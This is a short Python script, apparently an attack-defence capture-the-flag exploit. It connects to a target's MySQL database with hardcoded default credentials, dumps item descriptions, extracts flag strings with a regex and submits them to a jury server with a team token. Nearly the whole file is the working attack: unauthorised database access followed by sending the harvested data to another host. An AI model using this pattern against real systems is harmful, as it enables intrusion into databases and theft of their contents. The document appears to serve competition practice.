#!/usr/bin/env python3

import requests
import sys
import re
import mysql.connector

def main():

    # -------------------------- #
    # Connect to MySQL & dump it
    # -------------------------- #

    db_clint = mysql.connector.connect(
      host =        ip,
      user =        "alikexpress",
      password =    "secretpass",
      database =    "alikexpress"
    )

    mycursor = db_clint.cursor()
    mycursor.execute( "select description from items order by id desc limit 100;" )
    descriptions = mycursor.fetchall()
    mycursor.close()

    finded_flags = re.findall( '[A-Z0-9]{31}=' , str(descriptions) )

    # ------------------ #
    # Send flags to Jury
    # ------------------ #

    if finded_flags:
        send_flags( finded_flags )


def send_flags( flags: list ):

    # print( flags )

    resp = requests.put( 'http://10.10.10.10/flags',
        headers = {
            "X-Team-Token": "277b7eee31dfbba4",
            "Content-Type": "application/json"
        },
        json = flags
    )

    print( resp.text )


if __name__ == "__main__":

    ip =    sys.argv[1]
    port =  7000
    service_address = f"http://{ip}:{port}"

    main()